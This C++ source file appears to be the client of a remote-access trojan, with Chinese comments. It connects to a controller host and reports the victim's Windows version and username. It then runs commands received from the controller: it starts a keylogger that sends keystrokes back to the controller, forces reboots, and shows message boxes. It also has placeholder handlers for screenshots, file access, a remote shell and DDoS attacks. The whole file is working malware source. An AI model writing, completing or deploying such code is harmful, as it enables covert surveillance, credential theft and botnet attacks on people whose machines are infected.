#include "pch.h"
#include "Food.h"

Food::Food() {
	CmdSnapshoot = "CMD_SNAPSHOOT";
	CmdKeybd = "CMD_KEYBD";
	CmdFile = "CMD_FILE";
	CmdShell = "CMD_SHELL";
	CmdDdos = "CMD_DDOS";
	CmdProcess = "CMD_PROC";
	CmdSendBox = "SENDBOX";
	CmdReboot = "REBOOT";
	CmdOffline = "OFFLINE";
	CmdLogin = "LOGIN";
	CmdSplit = ";";
	CmdEnd = "\r\n";
}

void Food::connectTo(std::string domain, int port)
{
	// 建立socket连接
	if (!mSock.connectTo(domain, port)) {
		return;
	}

	// 发送登录信息
	if (!sendLogin()) {
		return;
	}

	// 缓冲区 八百八百地收
	const int packetSize = 800;
	char szData[packetSize];
	int ret;

	while (true) {
		ret = mSock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			// 连接错误时清楚本对象缓存 停止循环
			mBuf.erase(mBuf.begin(), mBuf.end());
			break;
		}

		addDataToBuffer(szData, ret);
	}
}

std::string Food::getUserName()
{
	char szUser[MAX_PATH];
	int size = MAX_PATH;
	GetUserNameA(szUser, (DWORD*)&size);
	return std::string(szUser);
}

std::string Food::getSystemModel()
{
	typedef struct _OSVERSIONINFOEX {
		DWORD dwOSVersionInfoSize;
		DWORD dwMajorVersion;
		DWORD dwMinorVersion;
		DWORD dwBuildNumber;
		DWORD dwPlatformId;
		TCHAR szCSDVersion[128];
		WORD  wServicePackMajor;
		WORD  wServicePackMinor;
		WORD  wSuiteMask;
		BYTE  wProductType;
		BYTE  wReserved;
	} OSVERSIONINFOEX, * POSVERSIONINFOEX, * LPOSVERSIONINFOEX;

	//const int VER_NT_WORKSTATION = 0x0000001;
	//const int SM_SERVERR2 = 89;
	//const int PROCESSOR_ARCHITECTURE_AMD64 = 9;

	SYSTEM_INFO info;
	GetSystemInfo(&info);
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

	std::string osname = "unknown OS";

	if (GetVersionEx((OSVERSIONINFO*)&os))
	{
		switch (os.dwMajorVersion)
		{
		case 4:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
					osname = "Microsoft Windows NT 4.0";
				else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
					osname = "Microsoft Windows 95";
				break;
			case 10:
				osname = "Microsoft Windows 98";
				break;
			case 90:
				osname = "Microsoft Windows Me";
				break;
			}
			break;

		case 5:
			switch (os.dwMinorVersion)
			{
			case 0:
				osname = "Microsoft Windows 2000";
				break;

			case 1:
				osname = "Microsoft Windows XP";
				break;

			case 2:
				if (os.wProductType == VER_NT_WORKSTATION
					&& info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				{
					osname = "Microsoft Windows XP Professional x64 Edition";
				}
				else if (GetSystemMetrics(SM_SERVERR2) == 0)
					osname = "Microsoft Windows Server 2003";
				else if (GetSystemMetrics(SM_SERVERR2) != 0)
					osname = "Microsoft Windows Server 2003 R2";
				break;
			}
			break;

		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Microsoft Windows Vista";
				else
					osname = "Microsoft Windows Server 2008";
				break;
			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Microsoft Windows 7";
				else
					osname = "Microsoft Windows Server 2008 R2";
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Microsoft Windows 8";
				else
					osname = "Microsoft Windows Server 2012";
				break;
			case 3:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Microsoft Windows 8.1";
				else
					osname = "Microsoft Windows Server 2012 R2";
				break;
			}
			break;

		case 10:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Microsoft Windows 10";
				else
					osname = "Microsoft Windows Server 2016 Technical Preview";
				break;
			}
			break;
		}
	}

	return osname;
}

bool Food::sendLogin()
{
	std::string data;
	data.append(CmdLogin + CmdSplit);
	data.append("SYSTEM" + CmdSplit + getSystemModel() + CmdSplit);
	data.append("USER_NAME" + CmdSplit + getUserName());
	data.append(CmdEnd);

	return mSock.sendData(data.data(), data.size());
}

void Food::addDataToBuffer(char* data, int size)
{
	mBuf.append(data, size);

	int endIndex;
	// 逐语句拆分为指令与数据 并处理
	while ((endIndex = mBuf.find(CmdEnd)) >= 0) {
		std::string line = mBuf.substr(0, endIndex);
		mBuf.erase(0, endIndex + CmdEnd.length());

		int firstSplit = line.find(CmdSplit);
		std::string cmd = line.substr(0, firstSplit);
		line.erase(0, firstSplit + CmdSplit.length());

		processCmd(cmd, line);
	}
}

void Food::processCmd(std::string& cmd, std::string& data)
{
	std::map<std::string, std::string> args = parseArgs(data);

	if (cmd == CmdSendBox) {
		doSendBox(args);
		return;
	}

	if (cmd == CmdReboot) {
		doReboot(args);
		return;
	}

	if (cmd == CmdOffline) {
		doOffline(args);
		return;
	}

	if (cmd == CmdSnapshoot) {
		doSnapshoot(args);
		return;
	}

	if (cmd == CmdKeybd) {
		doKeybd(args);
		return;
	}

	if (cmd == CmdFile) {
		doFile(args);
		return;
	}

	if (cmd == CmdShell) {
		doShell(args);
		return;
	}

	if (cmd == CmdDdos) {
		doDdos(args);
		return;
	}
}

std::map<std::string, std::string> Food::parseArgs(std::string& data)
{
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(CmdSplit);
	pos1 = 0;
	// 将参数名和参数逐一添加到vector
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + CmdSplit.size();
		pos2 = data.find(CmdSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));
	// 转换我参数名和参数的map形式存储
	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

void Food::doSnapshoot(std::map<std::string, std::string>& args)
{
}

void Food::doKeybd(std::map<std::string, std::string>& args)
{
	Keybd::startKeybd(mSock.mIp, atoi(args["PORT"].data()));
}

void Food::doFile(std::map<std::string, std::string>& args)
{
}

void Food::doShell(std::map<std::string, std::string>& args)
{
}

void Food::doDdos(std::map<std::string, std::string>& args)
{
}

void Food::doSendBox(std::map<std::string, std::string>& args)
{
	MessageBoxA(NULL, args["TEXT"].data(), "Message", MB_OK);
}

void Food::doReboot(std::map<std::string, std::string>&)
{
	system("shutdown -r -t 1");
}

void Food::doOffline(std::map<std::string, std::string>&)
{
	ExitProcess((UINT)NULL);
}

